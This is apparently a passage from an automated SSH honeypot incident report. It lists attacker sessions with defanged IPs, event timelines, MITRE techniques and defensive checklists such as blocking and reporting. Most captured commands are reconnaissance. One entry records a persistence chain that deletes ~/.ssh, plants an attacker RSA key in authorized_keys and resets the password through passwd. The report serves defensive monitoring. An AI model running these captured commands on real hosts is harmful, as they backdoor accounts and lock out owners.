| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:45:15` | `cowrie.session.connect` |
| `2026-08-15 01:45:15` | `cowrie.client.version` |
| `2026-08-15 01:45:15` | `cowrie.client.kex` |
| `2026-08-15 01:45:18` | `cowrie.login.success` |
| `2026-08-15 01:45:19` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b771b23c8a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:45 |
| **Last Seen** | 2026-08-15 01:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:45:53` | `cowrie.session.connect` |
| `2026-08-15 01:45:53` | `cowrie.client.version` |
| `2026-08-15 01:45:53` | `cowrie.client.kex` |
| `2026-08-15 01:45:54` | `cowrie.login.success` |
| `2026-08-15 01:45:56` | `cowrie.session.params` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.success` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.command.input` |
| `2026-08-15 01:45:56` | `cowrie.log.closed` |
| `2026-08-15 01:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54988d9984e8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 01:47 |
| **Last Seen** | 2026-08-15 01:52 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:47:13` | `cowrie.session.connect` |
| `2026-08-15 01:47:13` | `cowrie.client.version` |
| `2026-08-15 01:47:14` | `cowrie.client.kex` |
| `2026-08-15 01:47:16` | `cowrie.login.success` |
| `2026-08-15 01:47:17` | `cowrie.session.params` |
| `2026-08-15 01:47:17` | `cowrie.command.input` |
| `2026-08-15 01:47:17` | `cowrie.command.failed` |
| `2026-08-15 01:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541c40a215b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:47 |
| **Last Seen** | 2026-08-15 01:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:47:50` | `cowrie.session.connect` |
| `2026-08-15 01:47:50` | `cowrie.client.version` |
| `2026-08-15 01:47:50` | `cowrie.client.kex` |
| `2026-08-15 01:47:51` | `cowrie.login.success` |
| `2026-08-15 01:47:52` | `cowrie.session.params` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.success` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:52` | `cowrie.command.input` |
| `2026-08-15 01:47:53` | `cowrie.log.closed` |
| `2026-08-15 01:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2ce31d18b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:49 |
| **Last Seen** | 2026-08-15 01:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:49:46` | `cowrie.session.connect` |
| `2026-08-15 01:49:47` | `cowrie.client.version` |
| `2026-08-15 01:49:47` | `cowrie.client.kex` |
| `2026-08-15 01:49:48` | `cowrie.login.success` |
| `2026-08-15 01:49:50` | `cowrie.session.params` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.success` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.command.input` |
| `2026-08-15 01:49:50` | `cowrie.log.closed` |
| `2026-08-15 01:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e7ec5dde0f1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 01:54 |
| **Last Seen** | 2026-08-15 01:59 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:54:33` | `cowrie.session.connect` |
| `2026-08-15 01:54:33` | `cowrie.client.version` |
| `2026-08-15 01:54:33` | `cowrie.client.kex` |
| `2026-08-15 01:54:34` | `cowrie.login.success` |
| `2026-08-15 01:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271b2b78b75c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 01:54 |
| **Last Seen** | 2026-08-15 01:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:54:51` | `cowrie.session.connect` |
| `2026-08-15 01:54:51` | `cowrie.client.version` |
| `2026-08-15 01:54:51` | `cowrie.client.kex` |
| `2026-08-15 01:54:52` | `cowrie.login.success` |
| `2026-08-15 01:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c90377e146e

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 01:56 |
| **Last Seen** | 2026-08-15 01:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:56:41` | `cowrie.session.connect` |
| `2026-08-15 01:56:41` | `cowrie.client.version` |
| `2026-08-15 01:56:42` | `cowrie.client.kex` |
| `2026-08-15 01:56:42` | `cowrie.login.success` |
| `2026-08-15 01:56:43` | `cowrie.session.params` |
| `2026-08-15 01:56:43` | `cowrie.command.input` |
| `2026-08-15 01:56:43` | `cowrie.log.closed` |
| `2026-08-15 01:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ea1ba16080

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 02:01 |
| **Last Seen** | 2026-08-15 02:01 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:01:11` | `cowrie.session.connect` |
| `2026-08-15 02:01:16` | `cowrie.client.version` |
| `2026-08-15 02:01:16` | `cowrie.client.kex` |
| `2026-08-15 02:01:38` | `cowrie.login.success` |
| `2026-08-15 02:01:51` | `cowrie.session.params` |
| `2026-08-15 02:01:51` | `cowrie.command.input` |
| `2026-08-15 02:01:56` | `cowrie.log.closed` |
| `2026-08-15 02:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628b4b115b12

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-08-15 02:02 |
| **Last Seen** | 2026-08-15 02:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:02:41` | `cowrie.session.connect` |
| `2026-08-15 02:02:42` | `cowrie.client.version` |
| `2026-08-15 02:02:42` | `cowrie.client.kex` |
| `2026-08-15 02:02:44` | `cowrie.login.success` |
| `2026-08-15 02:02:44` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd68605594c9

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]21` |
| **First Seen** | 2026-08-15 02:02 |
| **Last Seen** | 2026-08-15 02:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:02:53` | `cowrie.session.connect` |
| `2026-08-15 02:02:54` | `cowrie.client.version` |
| `2026-08-15 02:02:54` | `cowrie.client.kex` |
| `2026-08-15 02:02:56` | `cowrie.login.success` |
| `2026-08-15 02:02:56` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]21` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b74c052ef848

| Field | Detail |
|---|---|
| **Source IP** | `34.14.77[.]4` |
| **First Seen** | 2026-08-15 02:08 |
| **Last Seen** | 2026-08-15 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:08:02` | `cowrie.session.connect` |
| `2026-08-15 02:08:02` | `cowrie.login.success` |
| `2026-08-15 02:08:03` | `cowrie.session.params` |
| `2026-08-15 02:08:03` | `cowrie.command.input` |
| `2026-08-15 02:08:03` | `cowrie.command.input` |
| `2026-08-15 02:08:03` | `cowrie.command.failed` |
| `2026-08-15 02:08:03` | `cowrie.command.input` |
| `2026-08-15 02:08:03` | `cowrie.log.closed` |
| `2026-08-15 02:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.77[.]4` to AbuseIPDB if not already reported
- [ ] Block `34.14.77[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc4cf25536c

| Field | Detail |
|---|---|
| **Source IP** | `34.14.77[.]4` |
| **First Seen** | 2026-08-15 02:08 |
| **Last Seen** | 2026-08-15 02:08 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:08:11` | `cowrie.session.connect` |
| `2026-08-15 02:08:11` | `cowrie.login.success` |
| `2026-08-15 02:08:11` | `cowrie.session.params` |
| `2026-08-15 02:08:11` | `cowrie.command.input` |
| `2026-08-15 02:08:11` | `cowrie.command.failed` |
| `2026-08-15 02:08:35` | `cowrie.log.closed` |
| `2026-08-15 02:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.77[.]4` to AbuseIPDB if not already reported
- [ ] Block `34.14.77[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505459dc97fb

| Field | Detail |
|---|---|
| **Source IP** | `34.14.77[.]4` |
| **First Seen** | 2026-08-15 02:08 |
| **Last Seen** | 2026-08-15 02:08 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:08:13` | `cowrie.session.connect` |
| `2026-08-15 02:08:13` | `cowrie.login.success` |
| `2026-08-15 02:08:13` | `cowrie.session.params` |
| `2026-08-15 02:08:13` | `cowrie.command.input` |
| `2026-08-15 02:08:35` | `cowrie.log.closed` |
| `2026-08-15 02:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.77[.]4` to AbuseIPDB if not already reported
- [ ] Block `34.14.77[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bab26fe0933

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 02:08 |
| **Last Seen** | 2026-08-15 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:08:21` | `cowrie.session.connect` |
| `2026-08-15 02:08:21` | `cowrie.client.version` |
| `2026-08-15 02:08:21` | `cowrie.client.kex` |
| `2026-08-15 02:08:21` | `cowrie.login.success` |
| `2026-08-15 02:08:21` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:08:22` | `cowrie.direct-tcpip.data` |
| `2026-08-15 02:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f42a234ca1b

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-15 02:08 |
| **Last Seen** | 2026-08-15 02:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:08:42` | `cowrie.session.connect` |
| `2026-08-15 02:08:43` | `cowrie.client.version` |
| `2026-08-15 02:08:43` | `cowrie.client.kex` |
| `2026-08-15 02:08:44` | `cowrie.login.success` |
| `2026-08-15 02:08:45` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7dce69252cb

| Field | Detail |
|---|---|
| **Source IP** | `122.176.45[.]238` |
| **First Seen** | 2026-08-15 02:08 |
| **Last Seen** | 2026-08-15 02:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:08:51` | `cowrie.session.connect` |
| `2026-08-15 02:08:52` | `cowrie.client.version` |
| `2026-08-15 02:08:52` | `cowrie.client.kex` |
| `2026-08-15 02:08:54` | `cowrie.login.success` |
| `2026-08-15 02:08:55` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.45[.]238` to AbuseIPDB if not already reported
- [ ] Block `122.176.45[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac45292627b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]50` |
| **First Seen** | 2026-08-15 02:10 |
| **Last Seen** | 2026-08-15 02:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:10:19` | `cowrie.session.connect` |
| `2026-08-15 02:10:19` | `cowrie.client.version` |
| `2026-08-15 02:10:19` | `cowrie.client.kex` |
| `2026-08-15 02:10:21` | `cowrie.login.success` |
| `2026-08-15 02:10:21` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]50` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676301f43d5d

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-08-15 02:10 |
| **Last Seen** | 2026-08-15 02:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:10:27` | `cowrie.session.connect` |
| `2026-08-15 02:10:28` | `cowrie.client.version` |
| `2026-08-15 02:10:28` | `cowrie.client.kex` |
| `2026-08-15 02:10:30` | `cowrie.login.success` |
| `2026-08-15 02:10:31` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-193e0e757094

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 02:15 |
| **Last Seen** | 2026-08-15 02:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:15:56` | `cowrie.session.connect` |
| `2026-08-15 02:15:56` | `cowrie.client.version` |
| `2026-08-15 02:15:56` | `cowrie.client.kex` |
| `2026-08-15 02:15:57` | `cowrie.login.success` |
| `2026-08-15 02:15:57` | `cowrie.session.params` |
| `2026-08-15 02:15:57` | `cowrie.command.input` |
| `2026-08-15 02:15:58` | `cowrie.log.closed` |
| `2026-08-15 02:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440a39f2eea0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:16 |
| **Last Seen** | 2026-08-15 02:17 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "123456\nm0b07ERkZv1X\nm0b07ERkZv1X"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:16:46` | `cowrie.session.connect` |
| `2026-08-15 02:16:46` | `cowrie.client.version` |
| `2026-08-15 02:16:48` | `cowrie.client.kex` |
| `2026-08-15 02:16:49` | `cowrie.login.success` |
| `2026-08-15 02:16:51` | `cowrie.session.params` |
| `2026-08-15 02:16:51` | `cowrie.command.input` |
| `2026-08-15 02:16:51` | `cowrie.command.failed` |
| `2026-08-15 02:16:51` | `cowrie.log.closed` |
| `2026-08-15 02:16:52` | `cowrie.session.params` |
| `2026-08-15 02:16:52` | `cowrie.command.input` |
| `2026-08-15 02:16:52` | `cowrie.session.file_download` |
| `2026-08-15 02:16:52` | `cowrie.log.closed` |
| `2026-08-15 02:17:11` | `cowrie.session.params` |
| `2026-08-15 02:17:11` | `cowrie.command.input` |
| `2026-08-15 02:17:11` | `cowrie.log.closed` |
| `2026-08-15 02:17:12` | `cowrie.session.params` |
| `2026-08-15 02:17:12` | `cowrie.command.input` |
| `2026-08-15 02:17:12` | `cowrie.command.input` |
| `2026-08-15 02:17:12` | `cowrie.command.failed` |
| `2026-08-15 02:17:13` | `cowrie.log.closed` |
| `2026-08-15 02:17:13` | `cowrie.session.params` |
| `2026-08-15 02:17:13` | `cowrie.command.input` |
| `2026-08-15 02:17:14` | `cowrie.log.closed` |
| `2026-08-15 02:17:15` | `cowrie.session.params` |
| `2026-08-15 02:17:15` | `cowrie.command.input` |
| `2026-08-15 02:17:15` | `cowrie.log.closed` |
| `2026-08-15 02:17:16` | `cowrie.session.params` |
| `2026-08-15 02:17:16` | `cowrie.command.input` |
| `2026-08-15 02:17:17` | `cowrie.log.closed` |
| `2026-08-15 02:17:17` | `cowrie.session.params` |
| `2026-08-15 02:17:17` | `cowrie.command.input` |
| `2026-08-15 02:17:17` | `cowrie.command.input` |
| `2026-08-15 02:17:18` | `cowrie.log.closed` |
